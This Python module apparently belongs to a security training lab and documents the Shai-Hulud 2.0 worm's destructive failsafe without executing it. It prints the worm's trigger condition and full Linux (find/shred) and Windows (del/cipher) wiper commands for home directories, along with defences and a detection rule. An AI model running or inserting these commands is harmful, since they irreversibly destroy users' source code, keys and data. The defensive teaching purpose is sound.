"""
phase_5_dead_mans_switch.py -- Phase 5: Dead Man's Switch (Documentation Only)
NEVER EXECUTES destructive code. MITRE ATT&CK: T1485, T1490
"""
from typing import Any, Dict

from utils import (
    mark_step_complete, print_detection, print_info, print_value,
    print_phase_banner, print_step, print_success, print_warning,
)

PHASE_NUM = 5
PHASE_NAME = "Dead Man's Switch"
PHASE_DESCRIPTION = "Destructive failsafe (documented only, never executed)"


def step_document_switch(config) -> Dict[str, Any]:
    """Step 5.1: Document the dead man's switch mechanism."""
    print_step("5.1", "Document the dead man's switch mechanism")

    print_info("The real Shai-Hulud 2.0 worm included a destructive failsafe:")
    print_info("")
    print_value("Trigger condition", "if (!githubApi.isAuthenticated() && !fetchedToken && !npmToken)")
    print_info("  When ALL authentication fails, the worm assumes it has been cornered.")
    print_info("")
    print_value("Linux action", 'find "$HOME" -type f -writable -user "$(id -un)" -print0 | xargs -0 -r shred -uvz -n 1')
    print_value("Windows action", 'del /F /Q /S "%USERPROFILE%*" && cipher /W:%USERPROFILE%')
    print_info("")
    print_warning("THIS CODE IS NEVER EXECUTED IN THE LAB.")
    print_info("")
    print_info("Why this is dangerous:")
    print_info("  1. HOSTAGE DYNAMIC: if npm and GitHub simultaneously revoke all tokens,")
    print_info("     thousands of infected machines trigger the wiper in parallel")
    print_info("  2. DEVELOPER IMPACT: home directory contains source code, SSH keys,")
    print_info("     IDE settings, browser profiles -- years of accumulated work")
    print_info("  3. IRREVERSIBLE: shred overwrites file contents before deleting;")
    print_info("     unlike ransomware, there is no decryption key")
    print_info("  4. FORENSIC DESTRUCTION: overwritten data cannot be recovered")
    print_info("")
    print_info("Defenses:")
    print_value("1", "Revoke tokens GRADUALLY during incident response (don't trigger wiper)")
    print_value("2", "Maintain offline backups of developer workstations")
    print_value("3", "Use EDR to detect shred/cipher commands targeting home directories")
    print_value("4", "Sandbox npm installs in containers (wiper only affects the container)")
    print_value("5", "Use read-only containers in CI/CD (wiper cannot modify filesystem)")

    print_detection("CWP", "shred/cipher commands targeting user home directory")
    mark_step_complete("5.1")
    print_success("Phase 5 complete (documentation only, no destructive code executed)")
    return {"documented": True, "executed": False}


STEPS = [
    ("5.1", "Document destructive failsafe", step_document_switch),
]

def run_phase(config) -> Dict[str, Any]:
    print_phase_banner(5, "DEAD MAN'S SWITCH -- Documentation Only")
    results = {}
    for step_id, _, step_func in STEPS:
        results[step_id] = step_func(config)
    return results
